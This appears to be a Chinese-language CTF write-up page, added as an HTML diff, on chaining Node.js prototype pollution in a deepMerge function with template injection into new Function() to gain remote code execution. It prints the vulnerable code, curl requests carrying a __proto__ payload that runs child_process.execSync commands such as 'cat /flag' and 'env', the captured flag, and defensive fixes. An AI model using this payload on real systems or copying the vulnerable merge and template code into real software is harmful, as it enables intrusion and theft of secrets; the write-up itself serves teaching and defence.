@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Node.js原型链污染到RCE — DARKSEC</title>
+<meta name="description" content="通过原型链污染+模板注入实现远程代码执行">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 原型链污染 / RCE</div>
+        <h1>Node.js原型链污染到RCE：从污染到拿Shell</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-17</span>
+          <span>⏱ 10 min read</span>
+          <span>🏷 原型链污染 / RCE / Node.js</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">概述</a></li>
+            <li><a href="#what-is-pp">什么是原型链污染</a></li>
+            <li><a href="#vuln-code">漏洞代码分析</a></li>
+            <li><a href="#exploit">利用过程</a></li>
+            <li><a href="#rce">从污染到RCE</a></li>
+            <li><a href="#defense">防御方案</a></li>
+          </ul>
+        </div>
+
+        <h2 id="overview">概述</h2>
+        <p>原型链污染（Prototype Pollution）是Node.js特有的安全漏洞，攻击者可以通过修改对象的原型链来影响整个应用的行为。当原型链污染与其他漏洞（如模板注入）结合时，可以实现远程代码执行（RCE）。</p>
+
+        <blockquote>
+          <p>原型链污染就像给所有猫咪都戴上了同一顶帽子——你改了一个，所有的都变了</p>
+        </blockquote>
+
+        <h2 id="what-is-pp">什么是原型链污染</h2>
+        <p>在JavaScript中，每个对象都有一个<code>__proto__</code>属性指向它的原型。当我们修改<code>Object.prototype</code>时，所有对象都会受到影响：</p>
+
+        <pre><code>// 正常情况
+const obj = {};
+console.log(obj.name);  // undefined
+
+// 污染原型后
+Object.prototype.name = "hacked";
+console.log(obj.name);  // "hacked" - 所有对象都有了name属性!</code></pre>
+
+        <p><strong>为什么危险？</strong></p>
+        <ul>
+          <li>可以覆盖应用的配置参数</li>
+          <li>可以注入恶意代码到模板引擎</li>
+          <li>可以绕过安全检查</li>
+          <li>可以修改数据库查询条件</li>
+        </ul>
+
+        <h2 id="vuln-code">漏洞代码分析</h2>
+        <p>以下是靶场中的漏洞代码：</p>
+
+        <h3>1. 深拷贝函数（存在漏洞）</h3>
+        <pre><code>function deepMerge(target, source) {
+  for (const key in source) {
+    const value = source[key];
+    if (value && typeof value === "object" && !Array.isArray(value)) {
+      if (!target[key]) {
+        target[key] = {};
+      }
+      deepMerge(target[key], value);  // 递归合并
+    } else {
+      target[key] = value;  // 直接赋值
+    }
+  }
+  return target;
+}</code></pre>
+
+        <p><strong>问题在哪？</strong></p>
+        <p>当<code>source</code>包含<code>__proto__</code>属性时，<code>deepMerge</code>会修改<code>Object.prototype</code>：</p>
+        <pre><code>// 攻击payload
+const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
+deepMerge({}, malicious);
+
+// 现在所有对象都有isAdmin属性
+const user = {};
+console.log(user.isAdmin);  // true!</code></pre>
+
+        <h3>2. 模板引擎（存在漏洞）</h3>
+        <pre><code>function renderTemplate(template, locals, options = {}) {
+  const escapeFunction = options.escapeFunction || "escapeHtml";
+  
+  // 危险！直接将escapeFunction拼入代码
+  const body = 
+    "const out = [];\n" +
+    `const escape = ${escapeFunction};\n` +  // 这里！
+    // ...
+  
+  // 使用new Function执行，相当于eval
+  const compiled = new Function("locals", "escapeHtml", "resolvePath", "require", body);
+  return compiled(locals, escapeHtml, resolvePath, require);
+}</code></pre>
+
+        <p><strong>问题在哪？</strong></p>
+        <p><code>options.escapeFunction</code>被直接拼入<code>new Function()</code>的代码中，如果能控制这个值，就能执行任意代码。</p>
+
+        <h2 id="exploit">利用过程</h2>
+
+        <h3>Step 1: 发现原型链污染入口</h3>
+        <p>页面有一个表单，POST数据到<code>/api/profile</code>。测试发现：</p>
+        <pre><code># 发送包含__proto__的JSON
+curl -X POST http://target/api/profile \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__": {"test": "polluted"}}'
+
+# 访问任意页面，发现test属性被污染
+curl http://target/preview/xxx
+# 页面显示 test: polluted</code></pre>
+
+        <h3>Step 2: 分析源码</h3>
+        <p>访问<code>/source</code>获取源码，发现：</p>
+        <ul>
+          <li><code>deepMerge</code>函数存在原型链污染</li>
+          <li><code>renderTemplate</code>使用<code>options.escapeFunction</code>拼接代码</li>
+          <li>模板渲染时会调用<code>new Function()</code></li>
+        </ul>
+
+        <h3>Step 3: 构造Payload</h3>
+        <p>污染<code>Object.prototype.escapeFunction</code>，注入JavaScript代码：</p>
+        <pre><code>Payload:
+escapeHtml;out.push(require("child_process").execSync("cat /flag").toString());var _tmp=0
+
+分解：
+- escapeHtml;  → 保持原有功能，分号结束
+- out.push(...)  → 将命令执行结果加入输出
+- require("child_process").execSync("cat /flag")  → 执行系统命令
+- .toString()  → 转为字符串
+- var _tmp=0  → 闭合变量声明</code></pre>
+
+        <h2 id="rce">从污染到RCE</h2>
+        <p>发送完整payload：</p>
+        <pre><code>curl -X POST http://target/api/profile \
+  -H "Content-Type: application/json" \
+  -d '{
+    "__proto__": {
+      "escapeFunction": "escapeHtml;out.push(require(\"child_process\").execSync(\"env\").toString());var _tmp=0"
+    }
+  }'</code></pre>
+
+        <p>访问预览页面，查看执行结果：</p>
+        <pre><code>curl http://target/preview/xxx
+
+输出：
+GZCTF_FLAG=flag{9e784bf015e14aa0a29ffee5befe53c6}
+FLAG=flag{9e784bf015e14aa0a29ffee5befe53c6}
+...</code></pre>
+
+        <p><strong>Flag: <code>flag{9e784bf015e14aa0a29ffee5befe53c6}</code></strong></p>
+
+        <h3>完整攻击链</h3>
+        <table>
+          <thead>
+            <tr>
+              <th>步骤</th>
+              <th>操作</th>
+              <th>结果</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>1</td>
+              <td>访问<code>/source</code>获取源码</td>
+              <td>发现deepMerge和renderTemplate漏洞</td>
+            </tr>
+            <tr>
+              <td>2</td>
+              <td>构造原型链污染payload</td>
+              <td>污染<code>escapeFunction</code>属性</td>
+            </tr>
+            <tr>
+              <td>3</td>
+              <td>注入RCE代码</td>
+              <td>执行<code>env</code>命令</td>
+            </tr>
+            <tr>
+              <td>4</td>
+              <td>读取环境变量</td>
+              <td>获取flag</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h2 id="defense">防御方案</h2>
+        <ul>
+          <li><strong>过滤__proto__</strong>：在合并对象时过滤掉<code>__proto__</code>、<code>constructor</code>、<code>prototype</code>等危险属性</li>
+          <li><strong>使用Object.create(null)</strong>：创建没有原型的对象</li>
+          <li><strong>使用Map代替Object</strong>：Map不受原型链污染影响</li>
+          <li><strong>冻结原型</strong>：<code>Object.freeze(Object.prototype)</code></li>
+          <li><strong>输入验证</strong>：严格验证JSON输入，拒绝包含危险键名的数据</li>
+          <li><strong>避免eval/new Function</strong>：不要将用户输入拼入动态代码</li>
+        </ul>
+
+        <pre><code>// 安全的深拷贝
+function safeDeepMerge(target, source) {
+  for (const key in source) {
+    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
+      continue;  // 跳过危险属性
+    }
+    // ... 正常合并逻辑
+  }
+}</code></pre>
+
+        <div style="text-align:center;padding:40px 0 20px;font-size:0.9rem;color:#c0c0d0;font-style:italic;">
+          ~ 感谢阅读 nya~ <img src="/assets/images/cat-final.png" alt="cat" style="width:1em;height:1em;vertical-align:middle;">
+        </div>
+
+        <div class="article-tags">
+          <span class="tag pink">原型链污染</span>
+          <span class="tag">RCE</span>
+          <span class="tag purple">Node.js</span>
+          <span class="tag yellow">CTF</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div style="text-align:center;margin-bottom:16px;">
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+      <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+      <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+    </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
